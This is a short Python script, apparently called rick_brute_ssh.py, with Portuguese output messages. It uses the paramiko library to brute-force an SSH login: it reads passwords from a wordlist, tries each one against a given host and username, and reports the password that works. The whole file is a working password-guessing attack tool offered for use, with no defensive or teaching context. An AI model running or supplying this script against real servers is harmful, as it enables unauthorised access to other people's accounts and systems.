#!/usr/bin/python

import paramiko

import sys

if len(sys.argv) < 3:
        print("use rick_brute_ssh.py <IP> usuario <lista>")
        sys.exit(0)

lista = sys.argv[3]
usuario = sys.argv[2]
host = sys.argv[1]

ssh = paramiko.SSHClient()

ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

f = open(lista)

for line in f.readlines():
	
	senha = line.split()	
	
	try:
		ssh.connect(host, username=usuario, password=senha[0])
	
	except paramiko.AuthenticationException:
		print("Acesso Negado", line)
		pass
	else:
		print("[+] Senha encontrada [+]",line)
		break
		
ssh.close()
